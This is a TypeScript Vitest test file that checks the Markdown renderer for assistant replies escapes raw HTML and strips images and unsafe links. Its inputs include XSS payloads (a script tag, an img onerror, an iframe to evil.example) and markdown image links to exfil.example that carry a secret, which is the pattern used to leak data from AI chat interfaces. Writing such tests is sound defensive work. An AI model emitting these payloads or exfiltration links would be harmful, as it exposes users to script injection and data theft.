import { describe, expect, it } from 'vitest';
import { renderMarkdown } from './markdown.ts';

describe('assistant reply rendering', () => {
  it('escapes raw HTML', () => {
    const html = renderMarkdown('Hallo <script>alert(1)</script> <img src=x onerror=alert(1)> <iframe src="https://evil.example">');
    expect(html).not.toMatch(/<script|<img|<iframe/i);
    expect(html).toContain('&lt;script&gt;');
  });

  it('never renders images, so no remote image requests can leak data', () => {
    const html = renderMarkdown('![leak](https://exfil.example/leak.png?d=secret) und ![x][ref]\n\n[ref]: https://exfil.example/x.png');
    expect(html).not.toMatch(/<img/i);
  });

  it('drops javascript:, data: and relative links but keeps http(s) links safe', () => {
    const html = renderMarkdown('[a](javascript:alert(1)) [b](data:text/html,x) [c](/api/v1/tasks) [d](https://ok.example/pfad)');
    expect(html).not.toMatch(/href="(javascript|data|\/api)/i);
    expect(html).toContain('<a href="https://ok.example/pfad" target="_blank" rel="noopener noreferrer nofollow">d</a>');
  });

  it('renders ordinary Markdown', () => {
    const html = renderMarkdown('**fett**\n\n- eins\n- zwei\n\n`code`');
    expect(html).toContain('<strong>fett</strong>');
    expect(html).toContain('<li>eins</li>');
    expect(html).toContain('<code>code</code>');
  });
});
